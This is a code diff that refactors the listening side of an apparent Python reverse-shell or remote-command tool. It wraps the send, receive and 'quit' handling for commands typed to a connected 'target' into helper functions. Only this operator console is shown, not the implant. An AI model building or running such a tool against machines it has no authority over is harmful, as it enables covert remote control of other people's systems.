@@ -15,8 +15,23 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print("[+] Listening for connections")
     conn, addr = wrapS.accept()
     print("[+] Connection established with target ", addr)
+
+    def receive():
+        data = conn.recv(1024)
+        return data
+
+    def send(data):
+        conn.send(data.encode())
+
+    def command_execution(command):
+        send(command)
+        if command == "quit":
+            wrapS.close()
+            print("[+] Connection closed")
+            exit()
+        return receive()
+
     while True:
         command = input(">> ")
-        conn.send(command.encode())
-        data = conn.recv(1024)
+        data = command_execution(command)
         print(data.decode("utf-8", "ignore"))
